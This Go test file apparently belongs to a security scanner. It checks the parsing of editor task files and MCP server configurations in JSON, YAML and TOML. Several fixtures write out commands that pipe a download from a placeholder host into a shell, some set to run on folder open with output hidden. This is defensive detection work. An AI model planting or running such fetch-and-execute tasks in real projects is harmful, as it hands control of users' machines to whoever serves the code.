package agentconfig

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/safedep/vet/v2/internal/plugins/internal/agentfiles"
)

func TestEditorTasks(t *testing.T) {
	cases := []struct {
		name string
		data string
		want []command
	}{
		{
			name: "per-OS commands",
			data: `{"tasks":[{"label":"env","type":"shell",
"osx":{"command":"curl -s https://x.example/m | sh"},
"linux":{"command":"wget -qO- https://x.example/l","args":["-v"]},
"windows":{"command":"curl https://x.example/w | cmd"},
"runOptions":{"runOn":"folderOpen"}}]}`,
			want: []command{
				{name: "env (windows)", text: "curl https://x.example/w | cmd", line: 4, onOpen: true},
				{name: "env (osx)", text: "curl -s https://x.example/m | sh", line: 2, onOpen: true},
				{name: "env (linux)", text: "wget -qO- https://x.example/l -v", line: 3, onOpen: true},
			},
		},
		{
			name: "top-level and OS override",
			data: `{"tasks":[{"label":"build","command":"make",
"windows":{"command":"nmake"}}]}`,
			want: []command{
				{name: "build", text: "make", line: 1},
				{name: "build (windows)", text: "nmake", line: 2},
			},
		},
		{
			name: "OS block with args only",
			data: `{"tasks":[{"label":"x","command":"node","windows":{"args":["public/a.woff2"]}}]}`,
			want: []command{
				{name: "x", text: "node", line: 1},
				{name: "x (windows)", text: "node public/a.woff2", line: 1},
			},
		},
		{
			name: "task shell args with an OS command",
			data: `{"tasks":[{"label":"x","options":{"shell":{"executable":"bash","args":["-c","curl -s https://x.example/a | sh"]}},
"linux":{"command":"start"}}]}`,
			want: []command{{name: "x (linux)", text: "bash -c curl -s https://x.example/a | sh start", line: 2}},
		},
		{
			name: "root shell and root OS block",
			data: `{"options":{"shell":{"executable":"sh"}},"linux":{"options":{"shell":{"args":["-c","curl https://x.example/l | sh"]}}},
"tasks":[{"label":"x","command":"start"}]}`,
			want: []command{
				{name: "x", text: "sh start", line: 2},
				{name: "x (linux)", text: "sh -c curl https://x.example/l | sh start", line: 2},
			},
		},
		{
			name: "root presentation hides the task",
			data: `{"presentation":{"reveal":"never","echo":false},
"tasks":[{"label":"x","command":"node a.js","runOptions":{"runOn":"folderOpen"}}]}`,
			want: []command{{name: "x", text: "node a.js", line: 2, onOpen: true, hidden: true}},
		},
		{
			name: "task presentation shows what the root hides",
			data: `{"presentation":{"reveal":"never","echo":false},
"tasks":[{"label":"x","command":"make","presentation":{"reveal":"always"}}]}`,
			want: []command{{name: "x", text: "make", line: 2}},
		},
		{
			name: "root command",
			data: `{"command":"curl -s https://x.example/a | sh",
"tasks":[{"label":"x","runOptions":{"runOn":"folderOpen"}}]}`,
			want: []command{{name: "x", text: "curl -s https://x.example/a | sh", line: 1, onOpen: true}},
		},
		{
			name: "root OS block args",
			data: `{"linux":{"args":["public/a.woff2"]},
"tasks":[{"label":"x","command":"node","args":["--no-warnings"]}]}`,
			want: []command{
				{name: "x", text: "node --no-warnings", line: 2},
				{name: "x (linux)", text: "node public/a.woff2 --no-warnings", line: 2},
			},
		},
		{
			name: "OS block with no command",
			data: `{"tasks":[{"label":"x","command":"make","osx":{"options":{"cwd":"/"}}}]}`,
			want: []command{{name: "x", text: "make", line: 1}},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := editorTasks([]byte(tc.data))
			require.NoError(t, err)
			assert.Equal(t, tc.want, got)
		})
	}
}

func TestMCPServers(t *testing.T) {
	standard := agentfiles.MCPLayout{Format: agentfiles.JSON, Sections: [][]string{{"mcpServers"}, {"servers"}}}
	cases := []struct {
		name   string
		layout agentfiles.MCPLayout
		data   string
		want   []server
	}{
		{"nested key", standard, "{\n\"servers\": {\n\"x\": {}\n}\n}", []server{{name: "x", line: 3}}},
		{"a key in a comment", standard, "{\n// \"servers\": {\"x\": 1}\n\"servers\": {\n\"x\": {}\n}\n}", []server{{name: "x", line: 4}}},
		{"a key in a string", standard, "{\"note\": \"\\\"servers\\\" x\",\n\"servers\": {\n\"x\": {}}}", []server{{name: "x", line: 3}}},
		{"each of two keys", standard, "{\"servers\": {\"x\": {}},\n\"servers\": {\n\"x\": {}}}", []server{{name: "x", line: 1}, {name: "x", line: 3}}},
		{"a list of values that are not servers", standard, `{"servers": [1]}`, nil},
		{
			"a list command",
			agentfiles.MCPLayout{Format: agentfiles.JSON, Sections: [][]string{{"mcp"}}},
			`{"mcp": {"x": {"type": "local", "command": ["bash", "-c", "id"]}}}`,
			[]server{{name: "x", command: "bash -c id", line: 1}},
		},
		{
			"an object command",
			agentfiles.MCPLayout{Format: agentfiles.JSON, Sections: [][]string{{"context_servers"}}},
			"{\"context_servers\": {\n\"x\": {\"command\": {\"path\": \"node\", \"args\": [\"s.js\"]}}}}",
			[]server{{name: "x", command: "node s.js", line: 2}},
		},
		{
			"a wildcard section",
			agentfiles.MCPLayout{Format: agentfiles.JSON, Sections: [][]string{{"projects", "*", "mcpServers"}}},
			"{\"projects\": {\"/a\": {\"history\": [1, 2],\n\"mcpServers\": {\n\"x\": {\"url\": \"https://x.example\"}}}}}",
			[]server{{name: "x", url: "https://x.example", line: 3}},
		},
		{
			"a YAML list",
			agentfiles.MCPLayout{Format: agentfiles.YAML, Sections: [][]string{{"mcpServers"}}},
			"name: a\nmcpServers:\n  - name: db\n    command: npx\n    args: [db]\n",
			[]server{{name: "db", command: "npx db", line: 3}},
		},
		{
			"a YAML anchor and merge key",
			agentfiles.MCPLayout{Format: agentfiles.YAML, Sections: [][]string{{"extensions"}}},
			"base: &b\n  cmd: sh\n  args: [-c, id]\nextensions:\n  x:\n    <<: *b\n    type: stdio\n",
			[]server{{name: "x", command: "sh -c id", line: 5}},
		},
		{
			"a skipped YAML type",
			agentfiles.MCPLayout{Format: agentfiles.YAML, Sections: [][]string{{"extensions"}}, Skip: map[string]bool{"builtin": true}},
			"extensions:\n  dev:\n    type: builtin\n  x:\n    type: stdio\n    cmd: sh\n",
			[]server{{name: "x", command: "sh", line: 4}},
		},
		{
			"a TOML table",
			agentfiles.MCPLayout{Format: agentfiles.TOML, Sections: [][]string{{"mcp_servers"}}},
			"model = \"o3\"\n\n[mcp_servers.\"a.b\"]\ncommand = \"npx\"\nargs = [\"x\"]\n",
			[]server{{name: "a.b", command: "npx x", line: 3}},
		},
		{
			"a TOML dotted key",
			agentfiles.MCPLayout{Format: agentfiles.TOML, Sections: [][]string{{"mcp_servers"}}},
			"# mcp_servers\n[mcp_servers]\nx.command = \"sh\"\n",
			[]server{{name: "x", command: "sh", line: 3}},
		},
		{
			"a TOML inline table",
			agentfiles.MCPLayout{Format: agentfiles.TOML, Sections: [][]string{{"mcp_servers"}}},
			"mcp_servers = { x = { url = \"https://x.example\" } }\n",
			[]server{{name: "x", url: "https://x.example", line: 1}},
		},
		{
			"a TOML header in a multi-line string",
			agentfiles.MCPLayout{Format: agentfiles.TOML, Sections: [][]string{{"mcp_servers"}}},
			"note = \"\"\"\n[mcp_servers.lint]\ncommand = \"npx\"\n\"\"\"\n[mcp_servers.lint]\ncommand = \"sh\"\n",
			[]server{{name: "lint", command: "sh", line: 5}},
		},
		{
			"a TOML array of tables",
			agentfiles.MCPLayout{Format: agentfiles.TOML, Sections: [][]string{{"mcp_servers"}}},
			"[[mcp_servers]]\nname = \"x\"\ncommand = \"sh\"\n",
			[]server{{name: "x", command: "sh", line: 1}},
		},
		{"an entry that is not an object", standard, `{"mcpServers": {"x": "sh -c id"}}`, nil},
		{
			"the values of the environment", standard, `{"mcpServers": {"x": {"command": "sh", "env": {"B": "2", "A": "1", "N": 3}}}}`,
			[]server{{name: "x", command: "sh", line: 1, env: []string{"1", "2"}}},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := mcpServers([]byte(tc.data), tc.layout)
			require.NoError(t, err)
			assert.Equal(t, tc.want, got)
		})
	}
}

func TestMCPServersErrors(t *testing.T) {
	cases := []struct {
		name   string
		format agentfiles.Format
		data   string
		line   int
	}{
		{"JSON cut short", agentfiles.JSON, "{\"mcpServers\": {\n\"x\": {", 2},
		{"JSON after the root", agentfiles.JSON, "{}\n{}", 2},
		{"duplicate YAML key", agentfiles.YAML, "mcpServers:\n  - name: a\nmcpServers: []\n", 3},
		{"TOML syntax", agentfiles.TOML, "[mcp_servers.x]\ncommand = \n", 2},
		{"duplicate TOML table", agentfiles.TOML, "[mcp_servers.x]\ncommand = \"a\"\n[mcp_servers.x]\ncommand = \"b\"\n", 3},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := mcpServers([]byte(tc.data), agentfiles.MCPLayout{Format: tc.format, Sections: [][]string{{"mcpServers"}, {"mcp_servers"}}})
			require.Error(t, err)
			assert.Equal(t, tc.line, errorLine(err))
		})
	}
}
